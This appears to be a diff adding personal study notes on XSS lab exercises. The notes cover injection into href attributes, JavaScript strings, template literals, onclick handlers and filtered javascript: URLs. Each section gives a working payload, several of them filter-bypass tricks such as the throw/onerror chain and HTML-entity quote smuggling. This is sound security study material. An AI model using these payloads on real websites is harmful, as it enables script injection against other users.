@@ -250,3 +250,119 @@ it's easy to inject something like `onclick=alert()` but we won't be able to
 see it because it inside the `head` tag. we should use `accesskey`.
 
 payload: `/?' accesskey='Alt+x' onclick='alert()`
+
+# Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+
+payload: `javascript:alert(1)`
+
+# Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+```js
+<script>
+var searchTerms = '123';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+say we add this: `123'; alert();` it won't execute, because there will be an
+excess `'` left which breaks the code: `'123';alerr();';...`
+
+but this: `123'; alert(); let var = 'test` works.
+
+Payload: `'-alert()-'`
+
+result: `var searchTerms = ''-alert()-'';`
+
+
+# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+`';alert(document.domain)//` is converted to `\';alert(document.domain)//`
+
+add a `\` =>  `\';alert(document.domain)//`, so it escapes the one is added by the app:`\\';alert(document.domain)//`
+
+or `\'-alert(1)//`
+
+
+# Reflected XSS in a javascript URL with some characters blocked
+
+characters could be restricted, on the website or a WAF blocking the
+request.
+
+another method of calling functions:
+
+- use `throw` with exception handler: `onerror=alert;throw 1`
+
+Assigns `alert()` to global exception handler, then `throw 1`, passes 1 to the
+exception handler (throws an error?).
+
+payload:
+`post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
+
+
+`throw` returns the last value in the comma separated list:
+
+`throw/**/onerror=alert,1337`
+
+  * `onerror` is JavaScript's error handler.
+  * `onerror=alert` assigns alert() to `onerror`, overwriting `error()` to do
+    `alert()`
+  * the error is going to throw the value `1337`.
+    we won't have `uncought` (default error handler behaviour) but `1337` alerted.
+
+`x=x=>{throw/**/onerror=alert,1337}`
+
+  * an arrow function:
+
+    we can't write it like `x=()=>` (as it's supposed to be written) because `()` will be blocked,so: `x=x=>`.
+
+    also no spaces, it's going to break the url.
+
+  * now the `throw` is inside the function, so it happens if it's called.
+
+`toString=x`
+
+  * it's default behaviour is to convert a data type to string.
+  * but now `toString` is the function `x`.
+  * so whenever JavaScript calls `toString` it's going to call `x`.
+
+`window+""`
+
+  * string concatenation, so `toString` is used by JavaScript.
+
+the js code to be injected in:
+
+`<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">`
+
+`fetch`: dispatching http requests and manipulating response, the url is `/analytics` and other http request data.
+
+we are inside the configuration options object of the `fetch` method and we should break out and add another option to the `fetch` API.
+
+with our payload we send three argument instead of two to `fetch`, but it doesn't consider the excess, but we can use it to assign a value to a variable.
+
+* `&`: in browser term: the next key value pair. it allows the page to
+  continue working.
+
+* `/**/` we can't inject spaces, but it's needed.
+
+# Reflected XSS into a JavaScript template literals, with `<>'"\` unicode escaped.
+
+js template literals are string literals that allow embedded js expressions:
+
+```js
+<script>
+var message = `0 search results for '123'`;
+document.getElementById('searchMessage').innerText = message;
+</script>
+```
+
+use `${}` to embed as expression to be executed: `${alert()}`
+
+`var message = `0 search results for '${alert()}'`;`
+
+
+# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+`<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">t</a>`
+
+if there isn't a single quote, it won't be escaped.
+payload: `http://test.com&apos;-alert(document.domain)-&apos;`
